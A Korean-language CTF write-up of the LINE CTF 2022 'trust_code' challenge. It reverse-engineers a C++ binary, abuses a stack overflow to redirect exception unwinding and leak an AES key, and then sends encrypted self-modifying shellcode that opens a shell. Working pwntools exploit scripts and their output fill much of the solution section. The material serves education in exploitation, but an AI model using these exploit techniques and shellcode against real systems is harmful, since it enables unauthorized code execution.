---
title: "[LINE CTF 2022] trust_code"
date: 2022-07-30 23:07:19
tags:
categories: [Security, CTF]
---

## 개요

[chall.zip](/uploads/line22-trust-code/chall.zip)


## 문제 분석

<blockquote class="callout-warning">
    <p>
    <strong>주의사항</strong><br>
    이 글의 내용을 이해하기 위해서는 C++ 예외 처리의 <a href="/2022/07/17/cpp-exception-handling/">내부 구현</a>에 대한 지식이 필요합니다.
    </p>
</blockquote>

64비트 x86_64 바이너리 `trust_code` 와 `Dockerfile` 등이 주어집니다. `Dockerfile` 을 비롯한 컨테이너 관련 파일은 원본 문제에는 없는 파일로, 대회 환경을 구현하기 위해 작성하였습니다. `secret_key.txt` 는 서버에만 있어야 하는 파일로, 대회 참가자에게 배포되지 않습니다. 바이너리는 심볼이 있고, Canary, NX, PIE 보호 기법이 적용되어 있습니다.

```bash
$ checksec trust_code
[*] '/home/user/study/ctf/line22/trust_code/trust_code'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

바이너리를 실행하면 iv와 code를 입력받으며, 아무 문자열이나 입력했더니 에러 메시지를 출력하고 종료합니다.

```
./trust_code
iv> aaaa
code> aaaa

= Executed =

Sorry for the inconvenience, there was a problem while decrypting code.
```

`main` 함수의 디컴파일 결과를 보면 다음과 같이 단순합니다.

```c
int __cdecl main()
{
  launch();
  return 0;
}
```

그런데 디스어셈블 결과를 보면 `__cxa_begin_catch` , `__cxa_end_catch` 함수를 호출하는 부분이 있습니다. 이는 예외 처리에서 사용되는 랜딩 패드 중 catch 블록을 나타냅니다. 내부에서는 `puts` 함수로 앞서 보았던 에러 메시지를 출력하고 있습니다.

```x86asm
.text:0000000000001860 ; int __cdecl main(int argc, const char **argv, const char **envp)
; ...
.text:0000000000001860 ; __unwind { // __gxx_personality_v0
.text:0000000000001860                 sub     rsp, 28h
.text:0000000000001864                 mov     rax, fs:28h
.text:000000000000186D                 mov     [rsp+28h+var_8], rax
.text:0000000000001872                 mov     [rsp+28h+var_C], 0
.text:000000000000187A ;   try {
.text:000000000000187A                 call    _Z6launchv      ; launch(void)
.text:000000000000187A ;   } // starts at 187A
.text:000000000000187F                 jmp     $+5
.text:0000000000001884 ; ---------------------------------------------------------------------------
.text:0000000000001884
.text:0000000000001884 loc_1884:                               ; CODE XREF: main+1F↑j
.text:0000000000001884                 jmp     loc_18E0
.text:0000000000001889 ; ---------------------------------------------------------------------------
.text:0000000000001889 ;   catch(...) // owned by 187A
.text:0000000000001889                 mov     rcx, rax
.text:000000000000188C                 mov     eax, edx
.text:000000000000188E                 mov     [rsp+28h+var_18], rcx
.text:0000000000001893                 mov     [rsp+28h+var_1C], eax
.text:0000000000001897                 mov     rdi, [rsp+28h+var_18] ; void *
.text:000000000000189C                 call    ___cxa_begin_catch
.text:00000000000018A1                 mov     cs:loop_cont, 0
.text:00000000000018AB ;   try {
.text:00000000000018AB                 lea     rdi, s          ; "\nSorry for the inconvenience, there wa"...
.text:00000000000018B2                 call    _puts
.text:00000000000018B2 ;   } // starts at 18AB
.text:00000000000018B7                 jmp     $+5
.text:00000000000018BC ; ---------------------------------------------------------------------------
.text:00000000000018BC
.text:00000000000018BC loc_18BC:                               ; CODE XREF: main+57↑j
.text:00000000000018BC                 xor     edi, edi        ; status
.text:00000000000018BE                 call    _exit
.text:00000000000018C3 ; ---------------------------------------------------------------------------
.text:00000000000018C3 ;   cleanup() // owned by 18AB
.text:00000000000018C3                 mov     rcx, rax
.text:00000000000018C6                 mov     eax, edx
.text:00000000000018C8                 mov     [rsp+28h+var_18], rcx
.text:00000000000018CD                 mov     [rsp+28h+var_1C], eax
.text:00000000000018D1 ;   try {
.text:00000000000018D1                 call    ___cxa_end_catch
.text:00000000000018D1 ;   } // starts at 18D1
```

따라서 `main` 함수의 소스 코드는 사실 다음과 같아야 합니다.

```c
int main() {
    try {
        launch();
    } catch (const std::exception& e) {
        puts("Sorry for the inconvenience, there was a problem while decrypting");
    }

    return 0;
}
```

`launch` 함수는 `secret_key.txt` 파일의 내용을 읽어 배열 `buf` 에 저장합니다. 이후 `buf` 의 내용을 전역 배열 `secret_key` 에 대입한 후 `service` 함수를 호출합니다. `buf` 배열의 크기에서 `secret_key` 의 길이는 16바이트임을 알 수 있습니다.

```c
void launch(void)
{
  int fd; // [rsp+1Ch] [rbp-2Ch]
  char buf[16]; // [rsp+30h] [rbp-18h] BYREF
  unsigned __int64 v2; // [rsp+40h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  *(_OWORD *)buf = 0LL;
  alarm(30u);
  signal(14, alarm_handler);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  fd = open("secret_key.txt", 0);
  read(fd, buf, 16uLL);
  close(fd);
  *(_OWORD *)secret_key = *(_OWORD *)buf;
  service();
}
```

`service` 함수는 배열 `buf` 에 iv를 입력받고, 동일하게 `buf` 의 내용을 전역 배열 `iv` 에 대입한 후 `loop` 함수를 호출합니다. 그런데 입력받는 길이가 배열의 크기보다 큰 32바이트로 스택 버퍼 오버플로우가 발생합니다. 

```c
void service(void)
{
  char buf[16]; // [rsp+10h] [rbp-18h] BYREF
  unsigned __int64 v1; // [rsp+20h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  printf("iv> ");
  read(0, buf, 32uLL);                          // buffer overflow!
  *(_OWORD *)iv = *(_OWORD *)buf;
  loop();
}
```

`loop` 함수는 `loop_cont` 값이 참이면 `run` 함수를 반복하여 호출합니다.

```c
void loop(void)
{
  while ( loop_cont )
    run();
}
```

`run` 함수는 `read_code` 함수를 호출하여 `code` 포인터를 반환받습니다. 이후 `&code[16]` 부터 32바이트를 `sc.code` 로 복사하고 `execute` 함수를 호출합니다. `sc` 는 `Shellcode` 타입의 객체로, 32바이트 크기의 배열인 `code` 를 유일한 필드로 가지고 있습니다.

```c
unsigned __int64 run(void)
{
  __int128 v0; // xmm0
  char *code; // [rsp+18h] [rbp-30h]
  Shellcode sc; // [rsp+20h] [rbp-28h] BYREF
  unsigned __int64 v4; // [rsp+40h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  code = read_code();
  v0 = *((_OWORD *)code + 1);
  *(_OWORD *)&sc.code[16] = *((_OWORD *)code + 2);
  *(_OWORD *)sc.code = v0;
  execute((unsigned __int8 *)&sc);
  Shellcode::~Shellcode(&sc);
  return __readfsqword(0x28u);
}
```

`read_code` 함수는 48바이트의 code를 배열 `buf` 에 입력받습니다. 이후 `buf` 를 인자로 하여 `decrypt` 함수를 호출하고 포인터를 반환받아 반환합니다.

```c
char *read_code(void)
{
  char buf[48]; // [rsp+20h] [rbp-38h] BYREF
  unsigned __int64 v2; // [rsp+50h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("code> ");
  memset(buf, 0, sizeof(buf));
  read(0, buf, 48uLL);
  return decrypt((unsigned __int8 *)buf);
}
```

`decrypt` 함수는 인자로 주어진 문자열을 `key` 와 `iv` 를 이용해 AES-CBC로 복호화합니다. 인자는 `read_code` 에서 입력받는 code이므로, 애초에 code는 암호문임을 알 수 있습니다. 복호화된 평문은 `out` 에 저장되는데, `out` 의 상위 16바이트가 `"TRUST_CODE_ONLY!"` 가 아니면 예외를 발생시키고 있습니다. 

```c
char *__fastcall decrypt(char *in)
{
  std::exception *exception; // [rsp+8h] [rbp-120h]
  char *out; // [rsp+18h] [rbp-110h]
  char key[248]; // [rsp+28h] [rbp-100h] BYREF
  unsigned __int64 v5; // [rsp+120h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  out = (char *)operator new[](48uLL);
  AES_set_decrypt_key((__int64)&secret_key, 128LL, (int *)key);
  AES_cbc_encrypt((__int64)in, (__int64)out, 48LL, (__int64)key, (__int64)iv, 0);
  if ( strncmp(out, "TRUST_CODE_ONLY!", 16uLL) )
  {
    exception = (std::exception *)__cxa_allocate_exception(8uLL);
    std::exception::exception(exception);
    __cxa_throw(
      exception,
      (struct type_info *)&`typeinfo for'std::exception,
      (void (__fastcall *)(void *))&std::exception::~exception);
  }
  return out;
}
```

`decrypt` 가 반환하는 `out` 은 그대로 `read_code` 의 반환값이 되어, `run` 함수에서 상위 16바이트를 제외한 나머지가 `sc.code` 로 복사됩니다. 이후 호출되는 `execute` 함수는 rwx 권한의 페이지를 할당하여 `sc.code` 의 내용을 복사하고 실행합니다. 이 때 `invalid_check` 함수에서 `sc.code` 를 필터링하는데, `\x0f` 또는 `\x05` 가 존재하지 않을 때만 실행을 허용합니다.

```c
void __fastcall execute(unsigned __int8 *a1)
{
  void (*addr)(void); // [rsp+8h] [rbp-20h]
  char buf[8]; // [rsp+18h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+20h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( (unsigned int)invalid_check(a1) != -1 )
  {
    addr = (void (*)(void))create_rwx(a1);
    addr();
    munmap(addr, 0x1000uLL);
  }
  printf("done?> ");
  read(0, buf, 2uLL);
  if ( buf[0] == 'y' || buf[0] == 'Y' )
    loop_cont = 0;
}
```

이상의 내용을 정리하면 프로그램은 다음과 같이 동작합니다.

1. `iv` 와 AES-CBC로 암호화된 code를 입력받아 평문으로 복호화합니다.
2. 평문의 상위 16바이트가 `"TRUST_CODE_ONLY!"` 가 아닌 경우 예외를 발생시킵니다.
3. 평문에 `\x0f` 또는 `\x05` 가 존재하지 않은 경우에만 rwx 페이지로 복사하여 실행합니다.


## 문제 풀이

셸을 획득하기 위해서는 상위 16바이트를 `"TRUST_CODE_ONLY!"`, 나머지를 셸코드로 채운 문자열을 AES-CBC로 암호화하여 code로 입력해야 합니다. 프로그램에서 복호화 과정에 특별한 취약점이 없고 `iv` 는 직접 입력할 수 있습니다. 따라서 서버에서 사용하는 `key` 값을 유출하여 올바른 암호문을 생성해야 합니다.

그런데 프로그램을 테스트하기 위해 `iv` 에 16개의 a, `code` 에 48개의 a를 입력하면 다음과 같이 명시적으로 호출하지도 않은 출력 루틴이 동작하는 것을 확인할 수 있습니다.

```python
#!/usr/bin/python3
from pwn import *

r = process("./trust_code")
# context.log_level = "debug"

def main():
    r.sendafter(b"iv>", b"a" * 16)
    r.sendafter(b"code>", b"a" * 48)

    r.interactive()

if __name__ == "__main__":
    main()
```

```
$ ./test.py
[+] Starting local process './trust_code': pid 2560632
[*] Switching to interactive mode
 [*] Process './trust_code' stopped with exit code 0 (pid 2560632)

= Executed =
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
Sorry for the inconvenience, there was a problem while decrypting code.
[*] Got EOF while reading in interactive
```

출력 루틴의 정체는 `run` 함수에 존재하는 랜딩 패드입니다. `run` 함수에서 `Shellcode` 객체를 선언하는데, 예외가 발생하면 스택 되감기 과정에서 이 객체를 소멸시켜야 하므로 소멸자를 호출하는 랜딩 패드를 먼저 방문하는 것입니다. `run` 함수의 그래프를 살펴보면 그림에서 색칠한 부분과 같이 다른 루틴과 동떨어진 블록이 하나 있습니다. 이 블록이 바로 랜딩 패드입니다.

![1.png](/images/line22-trust-code/1.png)

이번에는 버퍼 오버플로우를 일으키기 위해 code에 16개의 a와 8개의 b, 8개의 c를 입력하였습니다. 실행하면 세그멘테이션 오류가 발생하며 종료하는데, "stack smashing detected"와 같은 오류 메시지가 출력되지 않습니다. 이는 Canary 보호 기법에 의한 것이 아니라 다른 루틴에서 오류가 발생하여 종료하였음을 나타냅니다.

```python
# ...
def main():
    r.sendafter(b"iv>", b"a" * 16 + b"b" * 8 + b"c" * 8)
    r.sendafter(b"code>", b"a" * 48)

    r.interactive()
```

```
$ ./test.py
[+] Starting local process './trust_code': pid 2562716
[*] Switching to interactive mode
 [*] Got EOF while reading in interactive
$
[*] Process './trust_code' stopped with exit code -11 (SIGSEGV) (pid 2562716)
[*] Got EOF while sending in interactive
```

GDB를 붙여 실행하면 오류가 발생한 원인은 `_Unwind_RaiseException` 함수에서 호출한 루틴이 주소 `0x6363636363636363` 에 접근을 시도하였기 때문임을 확인할 수 있습니다. 이 주소는 버퍼 오버플로우를 일으키기 위해 입력한 8개의 c에 해당합니다. 또한 `_Unwind_RaiseException` 함수를 디스어셈블하면 호출한 루틴은 `uw_frame_state_for` 내장 함수임을 알 수 있습니다. (자세한 설명은 말머리에서 링크한 글의 '동적 분석' 문단을 참고하기 바랍니다)

```
Program received signal SIGSEGV, Segmentation fault.
0x00007ff413636c50 in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1
Python Exception <class 'AttributeError'>: 'NoneType' object has no attribute 'startswith'
...
pwndbg> pdisass 1
 ► 0x7ff413636c50    cmp    byte ptr [rax], 0x48
   0x7ff413636c53    jne    0x7ff413636bb0                <0x7ff413636bb0>

   0x7ff413636c59    movabs rdx, 0x50f0000000fc0c7
pwndbg> i r rax
rax            0x6363636363636363  7161677110969590627
pwndbg> k
#0  0x00007ff413636c50 in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1
#1  0x00007ff41363808b in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1
#2  0x00007ff41383b69c in __cxa_throw () from /lib/x86_64-linux-gnu/libstdc++.so.6
#3  0x000055ffe2bb5333 in decrypt(unsigned char*) ()
#4  0x000055ffe2bb53d6 in read_code() ()
#5  0x000055ffe2bb5627 in run() ()
#6  0x000055ffe2bb56d0 in loop() ()
#7  0x000055ffe2bb5748 in service() ()
#8  0x6363636363636363 in ?? ()
#9  0x0000000000000000 in ?? ()
pwndbg> disass _Unwind_RaiseException
Dump of assembler code for function _Unwind_RaiseException:
...
   0x00007ff413638080 <+304>:   mov    rsi,r13
   0x00007ff413638083 <+307>:   mov    rdi,r12
   0x00007ff413638086 <+310>:   call   0x7ff413636800
   0x00007ff41363808b <+315>:   cmp    eax,0x5
   0x00007ff41363808e <+318>:   je     0x7ff413638103 <_Unwind_RaiseException+435>
```

`uw_frame_state_for` 내장 함수는 인자로 전달된 `context` 구조체가 나타내는 프레임의 CIE와 FDE를 찾아 해석하는 함수입니다. 이 함수 내부에서 페이로드로 입력한 주소에 접근하는 것은 버퍼 오버플로우로 인해 먼저 스택이 오염되고, 오염된 내용을 스택 되감기 과정에서 참조하면서 `context` 구조체가 오염되었기 때문임을 추론할 수 있습니다. 이를 확인하기 위해 `uw_frame_state_for` 함수를 호출하는 `_Unwind_RaiseException+310` 주소에 중단점을 설정하고 GDB를 붙여 실행해 보겠습니다.

```
pwndbg> set $context=$rdi
pwndbg> continue
...
pwndbg> x/20gx $rdi
0x7ffd76e021f0: 0x00007ffd76e02468      0x00007ffd76e02470
0x7ffd76e02200: 0x0000000000000000      0x00007ffd76e02478
0x7ffd76e02210: 0x0000000000000000      0x0000000000000000
0x7ffd76e02220: 0x00007ffd76e024b0      0x0000000000000000
0x7ffd76e02230: 0x0000000000000000      0x0000000000000000
0x7ffd76e02240: 0x0000000000000000      0x0000000000000000
0x7ffd76e02250: 0x00007ffd76e024b8      0x00007ffd76e024c0
0x7ffd76e02260: 0x00007ffd76e02490      0x00007ffd76e02498
0x7ffd76e02270: 0x00007ffd76e026b8      0x0000000000000000
0x7ffd76e02280: 0x00007ffd76e026c0      0x000055d6cf1f7748
pwndbg> continue
...
pwndbg> x/20gx $context
0x7fff5b23be70: 0x00007fff5b23c0e8      0x00007fff5b23c0f0
0x7fff5b23be80: 0x0000000000000000      0x00007fff5b23c0f8
0x7fff5b23be90: 0x0000000000000000      0x0000000000000000
0x7fff5b23bea0: 0x00007fff5b23c130      0x0000000000000000
0x7fff5b23beb0: 0x0000000000000000      0x0000000000000000
0x7fff5b23bec0: 0x0000000000000000      0x0000000000000000
0x7fff5b23bed0: 0x00007fff5b23c138      0x00007fff5b23c140
0x7fff5b23bee0: 0x00007fff5b23c110      0x00007fff5b23c118
0x7fff5b23bef0: 0x00007fff5b23c368      0x0000000000000000
0x7fff5b23bf00: 0x00007fff5b23c370      0x6363636363636363
```

계속 실행하다 보면 `context->ra` 필드의 값이 `0x000055d6cf1f7748` 에서 `0x6363636363636363` 으로 바뀌는 것을 확인할 수 있습니다. 전자는 버퍼 오버플로우가 발생하는 `service` 루틴의 내부이고, 후자는 버퍼 오버플로우로 인해 변조된 리턴 주소입니다.

`context->ra` 필드는 스택 되감기 과정에서 personality 루틴이 랜딩 패드의 주소를 구하기 위해 참조하는 값입니다. 따라서 이 필드의 값을 적절히 변조하면 원하는 랜딩 패드를 방문할 수 있습니다. 앞서 `run` 함수는 출력 루틴인 `Shellcode` 의 소멸자를 호출하는 랜딩 패드를 가지고 있었습니다. `context->ra` 필드의 값을 `run` 함수 내부에서 `read_code` 함수를 호출하는 `run+23` 으로 변조하면, personality 루틴은 이를 기준으로 랜딩 패드의 주소를 구합니다. 그 결과 실행 흐름이 옮겨지면 `run` 함수의 랜딩 패드를 다시 방문하게 됩니다.

```
pwndbg> disass run
Dump of assembler code for function run():
   0x000055d6cf1f7610 <+0>:     sub    rsp,0x48
   0x000055d6cf1f7614 <+4>:     mov    rax,QWORD PTR fs:0x28
   0x000055d6cf1f761d <+13>:    mov    QWORD PTR [rsp+0x40],rax
   0x000055d6cf1f7622 <+18>:    call   0x55d6cf1f7370 <read_code()>
   0x000055d6cf1f7627 <+23>:    mov    QWORD PTR [rsp],rax
   ...
```

그런데 변조되는 값은 `context->ra` 만이므로, 프레임 자체는 `service` 함수를 호출하는 `launch` 함수로 되감아진 상태에서 실행 흐름만 `run` 함수의 랜딩 패드로 옮겨지게 됩니다. 그리고 `launch` 함수는 서버에 존재하는 AES 키 값인 `secret_key.txt` 파일을 읽어 스택 버퍼에 저장하는 함수입니다. 따라서 랜딩 패드에서 `Shellcode` 구조체의 소멸자는 스택에 선언된 `sc.code` 라고 생각되는 값을 출력하겠지만, 실제로는 `launch` 함수의 프레임에 존재하는 AES 키 값이 출력될 것입니다.

바이너리에서 `run+23` 코드의 오프셋은 `0x1627` 입니다. ASLR에 의해 하위 12비트를 제외한 주소는 런타임에 랜덤하게 정해지므로, 실제 주소의 하위 2바이트가 `0x5627` 이라고 가정하면 $1/16$의 확률로 일치하게 됩니다. 따라서 다음과 같이 `key` 값을 유출하기 위한 코드를 작성할 수 있습니다.

```python
#!/usr/bin/python3
from pwn import *

r = remote("localhost", 1234)
# r = process("./trust_code")
context.log_level = "debug"

def main():
    r.sendafter(b"iv>", b"a" * 24 + b"\x27\x56")
    r.sendafter(b"code>", b"a" * 8)

    r.interactive()

if __name__ == "__main__":
    main()
```

셸 스크립트로 무한 루프를 만들어 성공할 때까지 반복 실행하면 다음과 같이 `key` 값인 `"USER_SECRET_KEY!"` 가 출력됨을 확인할 수 있습니다.

```
$ while [ true ]; do ./leak.py; done
[+] Opening connection to localhost on port 1234: Done
...
[+] Opening connection to localhost on port 1234: Done
[DEBUG] Received 0x4 bytes:
    b'iv> '
[DEBUG] Sent 0x1a bytes:
    b"aaaaaaaaaaaaaaaaaaaaaaaa'V"
[DEBUG] Received 0x6 bytes:
    b'code> '
[DEBUG] Sent 0x8 bytes:
    b'a' * 0x8
[*] Switching to interactive mode
 [DEBUG] Received 0xa5 bytes:
    00000000  0a 3d 20 45  78 65 63 75  74 65 64 20  3d 0a 00 00  │·= E│xecu│ted │=···│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 0a 3d  │····│····│····│···=│
    00000030  20 45 78 65  63 75 74 65  64 20 3d 0a  00 1c 01 00  │ Exe│cute│d =·│····│
    00000040  00 00 00 00  79 00 00 00  00 00 00 00  55 53 45 52  │····│y···│····│USER│
    00000050  5f 53 45 43  52 45 54 5f  4b 45 59 21  0a 53 6f 72  │_SEC│RET_│KEY!│·Sor│
    00000060  72 79 20 66  6f 72 20 74  68 65 20 69  6e 63 6f 6e  │ry f│or t│he i│ncon│
    00000070  76 65 6e 69  65 6e 63 65  2c 20 74 68  65 72 65 20  │veni│ence│, th│ere │
    00000080  77 61 73 20  61 20 70 72  6f 62 6c 65  6d 20 77 68  │was │a pr│oble│m wh│
    00000090  69 6c 65 20  64 65 63 72  79 70 74 69  6e 67 20 63  │ile │decr│ypti│ng c│
    000000a0  6f 64 65 2e  0a                                     │ode.│·│
    000000a5

= Executed =
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
= Executed =
\x00\x00\x00\x00\x00\x00\x00\x00SER_SECRET_KEY!
Sorry for the inconvenience, there was a problem while decrypting code.
[*] Got EOF while reading in interactive
```

`key` 값을 유출하였으므로 셸코드를 암호화하여 전송하면 되는데, `\x0f` 와 `\x05` 를 사용하면 실패하는 조건이 있습니다. 따라서 `syscall` 와 `sysenter` 인스트럭션을 통해 시스템 콜을 호출할 수 없습니다. 그런데 코드가 복사 후 실행되는 영역은 쓰기와 실행이 모두 가능한 rwx 페이지입니다. 그러므로 런타임에 동적으로 셸코드의 내용을 수정하는 코드를 추가하면 `syscall` 인스트럭션을 실행할 수 있습니다.

사용자가 입력한 코드를 호출하는 부분은 `execute+57` 입니다. 이 주소에 중단점을 걸고 실행하면 해당 위치에서 `rax` 레지스터에는 rwx 페이지의 주소, `rsi` 레지스터에는 `0x1000` 이 저장되어 있습니다. 

```
Breakpoint 1, 0x000055f56b7fb589 in execute(unsigned char*) ()
...
pwndbg> pdisass 1
 ► 0x55f56b7fb589    call   qword ptr [rsp + 8]           <0x7fb6a29c7000>

   0x55f56b7fb58d    mov    rdi, qword ptr [rsp + 8]
   0x55f56b7fb592    mov    esi, 0x1000
pwndbg> i r rax rsi
rax            0x7fb6a29c7000      140422388936704
rsi            0x1000              4096
pwndbg> vmmap $rax
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x7fb6a29c7000     0x7fb6a29c8000 rwxp     1000 0      [anon_7fb6a29c7] +0x0
```

이들 레지스터의 값을 이용하여 셸코드의 마지막 2바이트에 `\x0f\x05` 를 대입하는 코드를 추가한 익스플로잇 코드를 다음과 같이 작성합니다. 익스플로잇 코드를 실행하면 셸을 획득할 수 있습니다.

```python
#!/usr/bin/python3
from pwn import *
from Crypto.Cipher import AES

r = remote("localhost", 1234)
# context.log_level = "debug"

def main():
    sc = b"\x66\x81\xee\xf1\x0a\x66\x89\x70\x1e"    # sub si,0xaf1 ; mov [rax+30],si
    sc += b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\xff\xff"   # \xff\xff becomes \x0f\x05

    key = b"USER_SECRET_KEY!"
    iv = b"a" * 16
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(b"TRUST_CODE_ONLY!" + sc)

    r.sendafter(b"iv>", iv)
    r.sendafter(b"code>", ct)

    r.interactive()

if __name__ == "__main__":
    main()
```

```
$ ./ex.py
[+] Opening connection to localhost on port 1234: Done
[*] Switching to interactive mode
 $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$
```